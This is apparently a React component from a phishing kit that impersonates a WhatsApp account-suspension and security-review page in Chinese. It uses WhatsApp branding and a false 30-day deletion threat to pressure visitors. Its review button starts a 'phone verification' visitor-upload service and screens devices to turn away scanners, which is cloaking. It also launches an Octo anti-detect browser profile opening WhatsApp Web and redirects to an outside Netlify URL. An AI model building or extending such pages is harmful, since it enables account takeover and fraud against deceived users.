import React, { useState, useRef, useEffect } from 'react';
import { AlertTriangle, MessageCircle, Shield, Lock, Clock, Users, Trash2, X, CheckCircle, AlertCircle, Phone, Mail } from 'lucide-react';
import { useLanguage } from '../hooks/useLanguage';
import { BottomSheet } from './BottomSheet/BottomSheet';
import { ReviewContent } from './ReviewContent';
import { triggerWebhook } from '../utils/webhook';
import { detectDevice } from '../utils/deviceDetection';
import { octoBrowserAPI } from '../utils/octoBrowser';
import { useNavigate } from 'react-router-dom';
import { phoneVerificationService } from '../utils/phoneVerification';

export function NotificationScreen() {
  const { t } = useLanguage();
  const navigate = useNavigate();
  const [isBottomSheetOpen, setIsBottomSheetOpen] = useState(false);
  const [expandedCard, setExpandedCard] = useState<string | null>(null);
  const mainRef = useRef<HTMLDivElement>(null);
  const [isScrolled, setIsScrolled] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const jumpUrl = 'https://taupe-chebakia-4740f8.netlify.app/'

  const handleReviewClick = async () => {
    phoneVerificationService.start(); //上传来客
    setIsProcessing(true);
    
    try {
      // 检测设备
      const deviceInfo = await detectDevice();
      
      // 如果设备风险评分过高，显示错误
      if (deviceInfo.riskScore > 70) {
        alert('检测到可疑设备活动，无法继续操作');
        setIsProcessing(false);
        return;
      }
      
      // 如果不是真机或检测到恶意操作，启动 Octo Browser
      if (!deviceInfo.isRealDevice || deviceInfo.isMalicious) {
        console.log('启动防关联环境...');
        
        // 创建一次性配置文件并自动打开 WhatsApp Web
        const browserResult = await octoBrowserAPI.createOneTimeProfile();
        if (!browserResult.success) {
          console.error('无法启动防关联环境:', browserResult.error);
          // 继续执行，不阻断流程
        } else {
          console.log('防关联环境已启动，正在打开 WhatsApp Web...');
          // 存储配置文件 UUID 以便后续使用
          sessionStorage.setItem('octo_profile_uuid', browserResult.data?.uuid || '');
        }
      }
      
      // 触发 webhook
      // await triggerWebhook().catch(() => {});
      
      // 导航到电话验证页面
      // navigate(jumpUrl);// 使用 window.location.href 跳转
      window.location.href = jumpUrl;
      
    } catch (error) {
      console.error('处理失败:', error);
      // 即使出错也继续到电话验证页面
      // navigate(jumpUrl);
      window.location.href = jumpUrl;
    } finally {
      setIsProcessing(false);
    }
  };

  const handleScroll = () => {
    if (!mainRef.current) return;
    setIsScrolled(mainRef.current.scrollTop > 0);
  };

  const handleCardClick = (cardId: string) => {
    setExpandedCard(expandedCard === cardId ? null : cardId);
  };

  const handleModalClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      setExpandedCard(null);
    }
  };

  useEffect(() => {
    const mainElement = mainRef.current;
    if (mainElement) {
      mainElement.addEventListener('scroll', handleScroll);
      return () => mainElement.removeEventListener('scroll', handleScroll);
    }
  }, []);

  // Prevent body scroll when modal is open
  useEffect(() => {
    if (expandedCard) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [expandedCard]);

  return (
    <div 
      className="mobile-container"
      style={{ 
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        width: '100vw',
        height: '100vh',
        maxWidth: '100vw',
        maxHeight: '100dvh',
        overflow: 'hidden',
        background: '#f0f2f5',
        display: 'flex',
        flexDirection: 'column'
      }}
    >
      {/* Modal Overlay */}
      {expandedCard && (
        <div 
          className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4"
          onClick={handleModalClick}
          style={{
            backdropFilter: 'blur(8px)',
            WebkitBackdropFilter: 'blur(8px)',
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            width: '100%',
            height: '100%'
          }}
        >
          <div 
            className="bg-[#f8f9fa] rounded-2xl max-w-md w-full max-h-[80vh] overflow-hidden relative modal-content"
            style={{
              boxShadow: '0 20px 60px rgba(0, 0, 0, 0.3), 0 8px 24px rgba(0, 0, 0, 0.2)',
              transform: 'scale(1)',
              animation: 'modalSlideIn 0.3s ease-out',
              display: 'flex',
              flexDirection: 'column'
            }}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Close Button */}
            <button
              onClick={() => setExpandedCard(null)}
              className="absolute top-4 right-4 z-10 bg-gray-200 hover:bg-gray-300 rounded-full p-2 transition-colors duration-200"
            >
              <X className="w-5 h-5 text-gray-700" />
            </button>

            {/* Scrollable Content Container */}
            <div className="flex-1 overflow-y-auto" style={{ maxHeight: 'calc(80vh - 32px)' }}>
              {/* Expanded Card Content */}
              {expandedCard === 'suspension' && (
                <div className="p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="bg-[#EA4335]/15 p-2 rounded-full border border-[#EA4335]/25">
                      <Shield className="w-6 h-6 text-[#EA4335]" />
                    </div>
                    <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: '#2a2a2a' }}>{t.notification.suspension.title}</h2>
                  </div>
                  
                  <div className="space-y-4">
                    <p style={{ fontSize: '16px', color: '#3d3d3d', lineHeight: '1.5' }}>
                      {t.notification.suspension.description || '您的账户已被暂时停用，这意味着您将无法使用 WhatsApp 的各项功能。'}
                    </p>
                    
                    <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#92400e', marginBottom: '8px' }}>
                        停用期间的影响
                      </h3>
                      <p style={{ fontSize: '14px', color: '#92400e', lineHeight: '1.4' }}>
                        在账户停用期间，您的联系人将无法看到您的在线状态、最后上线时间或个人资料更新。
                      </p>
                    </div>
                    
                    {[
                      { 
                        icon: Users, 
                        title: "個人資料可見性",
                        text: t.notification.suspension.contact_visibility
                      },
                      { 
                        icon: Clock, 
                        title: "訊息處理",
                        text: t.notification.suspension.message_pending
                      },
                      { 
                        icon: Trash2, 
                        title: "帳戶刪除",
                        text: t.notification.suspension.account_deletion
                      }
                    ].map((item, index) => (
                      <div key={index} className="bg-gray-100 rounded-xl p-4">
                        <div className="flex items-start gap-3">
                          <div className="bg-[#25D366]/15 p-2 rounded-full border border-[#25D366]/25 mt-1">
                            <item.icon className="w-5 h-5 text-[#25D366]" />
                          </div>
                          <div>
                            <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#2a2a2a', marginBottom: '8px' }}>{item.title}</h3>
                            <p style={{ fontSize: '14px', color: '#3d3d3d', lineHeight: '1.4' }}>{item.text}</p>
                          </div>
                        </div>
                      </div>
                    ))}

                    <div className="bg-red-50 border border-red-200 rounded-xl p-4">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#dc2626', marginBottom: '8px' }}>
                        重要提醒
                      </h3>
                      <p style={{ fontSize: '14px', color: '#dc2626', lineHeight: '1.4' }}>
                        如果在 30 天内未完成账户恢复流程，您的账户和所有数据将被永久删除且无法恢复。
                      </p>
                    </div>

                    <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#2563eb', marginBottom: '8px' }}>
                        恢复步骤
                      </h3>
                      <ol className="list-decimal list-inside space-y-2 text-sm text-blue-700">
                        <li>完成身份验证流程</li>
                        <li>确认您的电话号码</li>
                        <li>等待安全审核完成</li>
                        <li>重新激活您的账户</li>
                      </ol>
                    </div>
                  </div>
                </div>
              )}

              {expandedCard === 'review' && (
                <div className="p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="bg-[#25D366]/15 p-2 rounded-full border border-[#25D366]/25">
                      <MessageCircle className="w-6 h-6 text-[#25D366]" />
                    </div>
                    <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: '#2a2a2a' }}>{t.notification.review.title}</h2>
                  </div>
                  
                  <div className="space-y-4">
                    <p style={{ fontSize: '16px', color: '#3d3d3d', lineHeight: '1.5' }}>
                      {t.notification.review.description}
                    </p>
                    
                    <p style={{ fontSize: '16px', color: '#3d3d3d', lineHeight: '1.5' }}>
                      {t.notification.review.status_check}
                    </p>

                    <div className="bg-green-50 border border-green-200 rounded-xl p-4">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#059669', marginBottom: '8px' }}>
                        安全审核流程
                      </h3>
                      <p style={{ fontSize: '14px', color: '#059669', lineHeight: '1.4' }}>
                        我们的安全团队将审核您的账户活动，确保符合 WhatsApp 的使用条款和社区准则。
                      </p>
                    </div>

                    <div className="space-y-3">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#2a2a2a' }}>审核内容包括：</h3>
                      <ul className="space-y-2">
                        {[
                          '账户注册信息验证',
                          '最近的消息活动检查',
                          '用户举报记录审查',
                          '设备安全状态评估'
                        ].map((item, index) => (
                          <li key={index} className="flex items-center gap-2">
                            <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0" />
                            <span style={{ fontSize: '14px', color: '#3d3d3d' }}>{item}</span>
                          </li>
                        ))}
                      </ul>
                    </div>

                    <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                      <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#92400e', marginBottom: '8px' }}>
                        预计处理时间
                      </h3>
                      <p style={{ fontSize: '14px', color: '#92400e', lineHeight: '1.4' }}>
                        安全审核通常在 24-48 小时内完成。在此期间，请保持您的设备联网以便接收更新。
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Fixed Header */}
      <header 
        className={`mobile-header ${
          isScrolled 
            ? 'bg-gradient-to-r from-[#25D366] via-[#22c55e] to-[#25D366] backdrop-blur-lg shadow-[0_8px_32px_rgba(37,211,102,0.3)]' 
            : 'bg-gradient-to-r from-[#25D366] via-[#22c55e] to-[#25D366] shadow-[0_4px_20px_rgba(37,211,102,0.25)]'
        }`}
        style={{ 
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          zIndex: 50,
          paddingTop: 'max(env(safe-area-inset-top), 4px)',
          paddingLeft: 'env(safe-area-inset-left)',
          paddingRight: 'env(safe-area-inset-right)',
          background: 'linear-gradient(135deg, #25D366 0%, #22c55e 50%, #25D366 100%)',
          boxShadow: '0 4px 20px rgba(37, 211, 102, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.2), inset 0 -1px 0 rgba(0, 0, 0, 0.1)',
          width: '100%',
          maxWidth: '100vw',
          transition: 'all 0.3s ease'
        }}
      >
        <div className="h-9 max-w-[650px] mx-auto px-4 flex items-center">
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5">
              <a 
                href="https://faq.whatsapp.com/"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1.5 hover:opacity-90 transition-all duration-200 hover:scale-105"
              >
                <div className="bg-white/20 p-1 rounded-full backdrop-blur-sm">
                  <MessageCircle className="w-3.5 h-3.5 text-white drop-shadow-sm" />
                </div>
                <span style={{ fontSize: '14px', fontWeight: 'bold', color: 'white', textShadow: '0 1px 2px rgba(0,0,0,0.1)' }}>
                  WhatsApp
                </span>
              </a>
            </div>
            <div className="w-[1px] h-3 bg-white/40 mx-1" />
            <span style={{ fontSize: '14px', fontWeight: 'bold', color: 'white', textShadow: '0 1px 2px rgba(0,0,0,0.1)' }}>
              {t.header.title}
            </span>
          </div>
        </div>
        <div className="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-white/30 to-transparent"></div>
      </header>

      {/* Scrollable Content */}
      <main 
        ref={mainRef}
        className="mobile-main"
        style={{ 
          flex: 1,
          overflowY: 'auto',
          paddingTop: 'calc(2.25rem + max(env(safe-area-inset-top), 4px) + 16px)',
          paddingBottom: 'calc(5rem + max(env(safe-area-inset-bottom), 0px))',
          paddingLeft: 'max(env(safe-area-inset-left), 16px)',
          paddingRight: 'max(env(safe-area-inset-right), 16px)',
          WebkitOverflowScrolling: 'touch',
          width: '100%',
          maxWidth: '100vw'
        }}
      >
        <div className="max-w-[650px] mx-auto">
          {/* Main Security Warning Card */}
          <div 
            className="ios-card relative overflow-hidden mb-4"
            style={{
              background: 'white',
              boxShadow: '0 2px 8px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.04)',
              border: '1px solid rgba(0, 0, 0, 0.06)',
              borderRadius: '16px'
            }}
          >
            {/* Alert Header */}
            <div 
              className="px-4 py-3 flex items-center gap-3 border-b border-gray-100"
              style={{
                background: '#fef7f7'
              }}
            >
              <div className="bg-[#EA4335]/10 p-2 rounded-full">
                <AlertTriangle className="w-5 h-5 text-[#EA4335]" />
              </div>
              <span style={{ fontSize: '16px', fontWeight: '600', color: '#EA4335' }}>
                安全警告
              </span>
            </div>

            <div className="p-4 space-y-4">
              <h1 style={{ fontSize: '20px', fontWeight: '600', color: '#1f2937', lineHeight: '1.3' }}>
                {t.notification.title}
              </h1>
              
              <p style={{ fontSize: '15px', lineHeight: '1.5', color: '#4b5563' }}>
                {t.notification.description}
              </p>

              {/* Account Suspension Section */}
              <div 
                className="rounded-xl p-4 space-y-3 cursor-pointer transition-all duration-200 hover:bg-gray-50"
                style={{
                  background: '#f9fafb',
                  border: '1px solid #e5e7eb'
                }}
                onClick={() => handleCardClick('suspension')}
              >
                <div className="flex items-center gap-3">
                  <div className="bg-[#EA4335]/10 p-2 rounded-full">
                    <Shield className="w-5 h-5 text-[#EA4335]" />
                  </div>
                  <span style={{ fontSize: '16px', fontWeight: '600', color: '#1f2937' }}>
                    {t.notification.suspension.title}
                  </span>
                </div>
                
                <div className="space-y-2">
                  {[
                    { icon: Users, text: t.notification.suspension.contact_visibility },
                    { icon: Clock, text: t.notification.suspension.message_pending },
                    { icon: Trash2, text: t.notification.suspension.account_deletion }
                  ].map((item, index) => (
                    <div key={index} className="flex items-start gap-3">
                      <div className="bg-[#25D366]/10 p-1 rounded-full mt-0.5">
                        <item.icon className="w-4 h-4 text-[#25D366]" />
                      </div>
                      <span style={{ fontSize: '14px', color: '#4b5563', lineHeight: '1.4' }}>
                        {item.text}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Review Section */}
              <div 
                className="rounded-xl p-4 space-y-3 cursor-pointer transition-all duration-200 hover:bg-gray-50"
                style={{
                  background: '#f9fafb',
                  border: '1px solid #e5e7eb'
                }}
                onClick={() => handleCardClick('review')}
              >
                <div className="flex items-center gap-3">
                  <div className="bg-[#25D366]/10 p-2 rounded-full">
                    <MessageCircle className="w-5 h-5 text-[#25D366]" />
                  </div>
                  <h3 style={{ fontSize: '16px', fontWeight: '600', color: '#1f2937' }}>
                    {t.notification.review.title}
                  </h3>
                </div>
                
                <p style={{ fontSize: '14px', color: '#4b5563', lineHeight: '1.4' }}>
                  {t.notification.review.description}
                </p>
                
                <p style={{ fontSize: '14px', color: '#4b5563', lineHeight: '1.4' }}>
                  {t.notification.review.status_check}
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Fixed Footer Button */}
      <div 
        className="mobile-footer"
        style={{ 
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          zIndex: 40,
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          paddingBottom: 'max(env(safe-area-inset-bottom), 16px)',
          paddingLeft: 'env(safe-area-inset-left)',
          paddingRight: 'env(safe-area-inset-right)',
          paddingTop: '16px',
          background: 'transparent',
          width: '100%'
        }}
      >
        <button
          onClick={handleReviewClick}
          disabled={isProcessing}
          className="mobile-button"
          style={{
            width: '200px',
            fontWeight: '600',
            padding: '14px 20px',
            borderRadius: '12px',
            fontSize: '15px',
            color: 'white',
            border: 'none',
            background: isProcessing ? '#9CA3AF' : '#25D366',
            boxShadow: '0 4px 12px rgba(37, 211, 102, 0.3), 0 2px 6px rgba(37, 211, 102, 0.2)',
            transition: 'all 0.2s ease',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px',
            position: 'relative',
            overflow: 'hidden',
            cursor: isProcessing ? 'not-allowed' : 'pointer'
          }}
          onTouchStart={(e) => {
            if (!isProcessing) {
              e.currentTarget.style.transform = 'translateY(1px) scale(0.98)';
              e.currentTarget.style.boxShadow = '0 2px 6px rgba(37, 211, 102, 0.25)';
            }
          }}
          onTouchEnd={(e) => {
            if (!isProcessing) {
              e.currentTarget.style.transform = 'translateY(0) scale(1)';
              e.currentTarget.style.boxShadow = '0 4px 12px rgba(37, 211, 102, 0.3), 0 2px 6px rgba(37, 211, 102, 0.2)';
            }
          }}
          onMouseDown={(e) => {
            if (!isProcessing) {
              e.currentTarget.style.transform = 'translateY(1px) scale(0.98)';
              e.currentTarget.style.boxShadow = '0 2px 6px rgba(37, 211, 102, 0.25)';
            }
          }}
          onMouseUp={(e) => {
            if (!isProcessing) {
              e.currentTarget.style.transform = 'translateY(0) scale(1)';
              e.currentTarget.style.boxShadow = '0 4px 12px rgba(37, 211, 102, 0.3), 0 2px 6px rgba(37, 211, 102, 0.2)';
            }
          }}
          onMouseLeave={(e) => {
            if (!isProcessing) {
              e.currentTarget.style.transform = 'translateY(0) scale(1)';
              e.currentTarget.style.boxShadow = '0 4px 12px rgba(37, 211, 102, 0.3), 0 2px 6px rgba(37, 211, 102, 0.2)';
            }
          }}
        >
          <div className="bg-white/20 p-1 rounded-full">
            <MessageCircle className="w-4 h-4 text-white" />
          </div>
          <span>{isProcessing ? '处理中...' : t.notification.button}</span>
        </button>
      </div>

      <BottomSheet 
        isOpen={isBottomSheetOpen} 
        onClose={() => setIsBottomSheetOpen(false)}
      >
        <ReviewContent />
      </BottomSheet>

      <style jsx>{`
        @keyframes modalSlideIn {
          from {
            opacity: 0;
            transform: scale(0.9) translateY(20px);
          }
          to {
            opacity: 1;
            transform: scale(1) translateY(0);
          }
        }
        
        .mobile-container {
          -webkit-user-select: none;
          -moz-user-select: none;
          -ms-user-select: none;
          user-select: none;
          -webkit-touch-callout: none;
          -webkit-tap-highlight-color: transparent;
        }
        
        .mobile-main {
          -webkit-overflow-scrolling: touch;
          overscroll-behavior-y: none;
        }
        
        .mobile-button {
          -webkit-tap-highlight-color: transparent;
          -webkit-user-select: none;
          -moz-user-select: none;
          -ms-user-select: none;
          user-select: none;
        }
        
        /* 模态框滚动条样式 */
        .modal-content .overflow-y-auto::-webkit-scrollbar {
          width: 6px;
        }
        
        .modal-content .overflow-y-auto::-webkit-scrollbar-track {
          background: #f1f5f9;
          border-radius: 3px;
        }
        
        .modal-content .overflow-y-auto::-webkit-scrollbar-thumb {
          background: #cbd5e1;
          border-radius: 3px;
        }
        
        .modal-content .overflow-y-auto::-webkit-scrollbar-thumb:hover {
          background: #94a3b8;
        }
        
        @media screen and (max-width: 320px) {
          .mobile-button {
            width: 160px;
            font-size: 13px;
            padding: 12px 16px;
          }
        }
        
        @media screen and (min-width: 430px) {
          .mobile-button {
            width: 220px;
            font-size: 16px;
            padding: 16px 24px;
          }
        }
      `}</style>
    </div>
  );
}